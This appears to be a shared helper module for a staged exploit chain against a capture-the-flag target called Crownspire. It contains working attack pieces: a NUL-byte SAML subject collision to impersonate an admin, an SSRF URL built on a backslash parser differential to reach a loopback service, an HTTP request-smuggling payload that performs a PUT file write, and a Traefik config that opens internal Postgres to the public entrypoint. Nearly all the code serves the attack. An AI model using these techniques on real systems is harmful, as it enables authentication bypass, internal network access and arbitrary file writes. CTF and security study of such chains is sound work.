#!/usr/bin/env python3
"""
Shared helpers for the Crownspire / ca_insane step-by-step solver scripts.

The full end-to-end exploit lives in `solve.py` (+ `poc.py`, both kept as-is).
The `stepN_*.py` scripts split that same chain into individually runnable
stages so each link can be driven and inspected by hand. They share the small
set of helpers below.

State passing between steps
---------------------------
Stage 1 (step1_saml_auth.py) writes the admin session cookie to a file
(default: `session.cookie`, next to these scripts). Stages 2 and 3 read it from
that file by default, or you can pass `--cookie 'connect.sid=...'` explicitly.
"""
import json
import sys
import urllib.parse
from html.parser import HTMLParser
from pathlib import Path

import requests

# --- reserved identity + the NUL-bearing variant that collides under libxml2 ---
HS = "high-scribe@registry.valyssar.local"
NUL_SUBJECT = HS + "\x00x"          # requests url-encodes the 0x00 to %00 on the wire
SIGNUP_PASSWORD = "pw1234"

# default file used to hand the admin cookie from stage 1 to the later stages
DEFAULT_COOKIE_FILE = Path(__file__).resolve().parent / "session.cookie"

# Traefik TCP catch-all: when this overwrites /etc/traefik/dynamic.yml the file
# provider (watch:true) hot-reloads and the public entrypoint carries raw TCP to
# the internal Postgres (one-shot — it replaces the HTTP routers).
PG_DYNAMIC_YML = (
    'tcp:\n'
    '  routers:\n'
    '    pg:\n'
    '      rule: "HostSNI(`*`)"\n'
    '      entryPoints: ["web"]\n'
    '      service: pg\n'
    '  services:\n'
    '    pg:\n'
    '      loadBalancer:\n'
    '        servers:\n'
    '          - address: "127.0.0.1:5432"\n'
)


def log(stage, msg):
    print(f"  [{stage}] {msg}", flush=True)


# ---------------------------------------------------------------------------
# HTML form parsing — used by stage 1 to drive the SimpleSAMLphp login form.
# ---------------------------------------------------------------------------
class _FormParser(HTMLParser):
    """Collect every <form> with its action/method and all <input> name=value."""

    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action", ""),
                         "method": (a.get("method", "get") or "get").lower(),
                         "inputs": {}}
        elif tag == "input" and self._cur is not None:
            name = a.get("name")
            if name is not None:
                self._cur["inputs"][name] = a.get("value", "")

    def handle_endtag(self, tag):
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None


def parse_forms(html):
    p = _FormParser()
    p.feed(html)
    if p._cur is not None:          # tolerate an unclosed <form>
        p.forms.append(p._cur)
    return p.forms


def pick_login_form(html):
    """Return (inputs, action) of the SimpleSAMLphp username/password form."""
    for f in parse_forms(html):
        keys = {k.lower() for k in f["inputs"]}
        if "username" in keys or "password" in keys or "AuthState" in f["inputs"]:
            return f["inputs"], f["action"]
    forms = parse_forms(html)
    if forms:
        return forms[0]["inputs"], forms[0]["action"]
    return None, None


# ---------------------------------------------------------------------------
# Cookie persistence — hand the admin session from stage 1 to later stages.
# ---------------------------------------------------------------------------
def save_cookie(cookie, path=None):
    """Persist the admin cookie string (e.g. `connect.sid=...`) to a file."""
    p = Path(path) if path else DEFAULT_COOKIE_FILE
    p.write_text(cookie)
    return p


def load_cookie(cookie=None, path=None):
    """Return the admin cookie: prefer an explicit value, else read the file."""
    if cookie:
        return cookie
    p = Path(path) if path else DEFAULT_COOKIE_FILE
    if not p.exists():
        sys.exit(f"[!] no --cookie given and {p} not found; run step1_saml_auth.py "
                 f"first (or pass --cookie 'connect.sid=...').")
    val = p.read_text().strip()
    if not val:
        sys.exit(f"[!] {p} is empty; re-run step1_saml_auth.py.")
    return val


# ---------------------------------------------------------------------------
# Courier console — the admin-only egress used for the SSRF (S2) and the
# smuggled write (S3). POST-only; redirects disabled.
# ---------------------------------------------------------------------------
def courier(base, cookie, address, headers=None, body=None, timeout=15):
    payload = {"address": address}
    if headers is not None:
        payload["headers"] = headers
    if body is not None:
        payload["body"] = body
    return requests.post(base + "/admin/courier",
                         headers={"cookie": cookie, "content-type": "application/json"},
                         data=json.dumps(payload), allow_redirects=False, timeout=timeout)


def inner_url(inner_port, decoy, path):
    """Build the courier SSRF address for the loopback Inner Ward.

    Backslash-in-authority parser differential: the courier's SSRF filter reads
    urlsplit().hostname (the public decoy, which resolves off-box and passes the
    routable-address check) while requests/urllib3 terminate the authority at the
    backslash, connect to 127.0.0.1:<port>, and collapse the `/../` dot-segment so
    the wire request line is `<METHOD> /<path>`.
    """
    return f"http://127.0.0.1:{inner_port}\\@{decoy}/../{path}"


def smuggled_write(path, content):
    """The second (smuggled) request: a PUT /records/write the POST-only courier
    can never issue directly. Carried in the courier's JSON `body` channel; oatpp
    parses it as request #2 once the space-in-name header drops Content-Length."""
    import base64
    inner = json.dumps({"path": path, "data": base64.b64encode(content.encode()).decode()})
    return ("PUT /records/write HTTP/1.1\r\nHost: innerward\r\n"
            "Content-Type: application/json\r\n"
            f"Content-Length: {len(inner)}\r\n\r\n" + inner)
